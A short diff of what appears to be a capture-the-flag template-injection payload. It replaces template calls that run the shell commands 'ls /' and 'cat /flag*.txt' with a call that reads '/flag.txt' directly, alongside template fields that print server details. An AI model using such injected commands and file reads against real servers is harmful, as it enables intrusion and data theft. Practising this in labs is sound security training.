@@ -17,5 +17,4 @@
 {{.ServerInfo.KernelVersion}}
 {{.ServerInfo.Memory}}
 
-{{.GetServerInfo "ls /"}}
-{{.GetServerInfo "cat /flag*.txt"}}
+{{.OutFileContents "/flag.txt"}}
